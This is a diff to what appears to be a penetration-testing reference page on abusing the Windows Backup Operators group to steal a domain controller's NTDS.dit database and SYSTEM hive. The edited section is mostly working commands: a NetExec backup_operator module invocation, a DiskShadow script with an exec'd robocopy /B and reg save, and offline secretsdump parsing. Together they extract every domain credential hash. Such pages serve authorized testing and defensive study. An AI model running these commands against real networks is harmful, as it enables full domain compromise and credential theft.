@@ -15,24 +15,38 @@ The **Backup Operators** group grants **`SeBackupPrivilege`** (and `SeRestorePri
 
 ## Extracting the domain database
 
-`NTDS.dit` is locked while the DC runs, so you read it from a **shadow copy** (or via VSS remotely), using the backup privilege to bypass the ACL:
+`NTDS.dit` is locked while the DC runs, so you read it from a **shadow copy**, using the backup privilege to bypass the ACL. With **only** Backup Operators rights, use the Backup-Operator-specific tooling rather than the generic remote-VSS path:
 
 ```bash
-# Remote, from Linux: impacket uses the account's SeBackupPrivilege to VSS-snapshot and read NTDS
-secretsdump.py -just-dc -use-vss 'EXAMPLE/backupop:password@<dc>'
-
-# NetExec module automates the DiskShadow path (snapshot, robocopy /B, reg save, secretsdump)
-nxc smb <dc> -u backupop -p password -M ntds_diskshadow
+# NetExec backup_operator module: snapshots, pulls NTDS.dit + SYSTEM, prints the secretsdump line
+nxc smb <dc> -u backupop -p password -M backup_operator
 ```
 
-On-host (as a Backup Operators member), the manual path is a DiskShadow script that snapshots `C:`, `robocopy /B` the `NTDS.dit` off the snapshot, `reg save HKLM\SYSTEM system.hive`, then parse offline:
+On-host (as a Backup Operators member), DiskShadow takes a **script file** with one directive per line (semicolons are not separators), and external commands run through `exec`:
 
 ```text
-diskshadow> set context persistent nowriters ; add volume C: alias cc ; create ; expose %cc% Z:
-robocopy /B Z:\Windows\NTDS . NTDS.dit
-reg save HKLM\SYSTEM system.hive
+# shadow.txt  ->  run with:  diskshadow /s shadow.txt
+set context persistent nowriters
+set metadata C:\Windows\Temp\meta.cab
+add volume C: alias cc
+create
+expose %cc% Z:
+exec C:\Windows\Temp\copy.cmd
+reset
+```
+
+```text
+# copy.cmd (invoked by the exec line): backup-mode copy off the snapshot
+robocopy /B Z:\Windows\NTDS C:\Windows\Temp NTDS.dit
+reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
+```
+
+```bash
+# parse the files offline
 secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
 ```
+
+Impacket's generic `secretsdump.py -use-vss` is **not** usable with Backup Operators alone: it drives `vssadmin` and RemoteRegistry through the service-control manager, which needs local-admin rights, so keep it for when you also hold an administrator credential.
 
 ## Exploitation notes
 
@@ -43,9 +57,9 @@ secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
 
 ## Tools
 
-- **Impacket `secretsdump.py -use-vss`**: remote NTDS read via the backup privilege.
-- **NetExec `-M ntds_diskshadow`**: automated DiskShadow NTDS dump over WinRM/SMB.
+- **NetExec `-M backup_operator`**: automated Backup-Operator NTDS dump (DiskShadow + robocopy /B + SYSTEM hive) over SMB.
 - **diskshadow + robocopy /B**: native on-host snapshot and backup-mode copy.
+- **Impacket `secretsdump.py -use-vss`**: remote VSS NTDS read, but needs local-admin rights, not Backup Operators alone.
 
 ## References
 
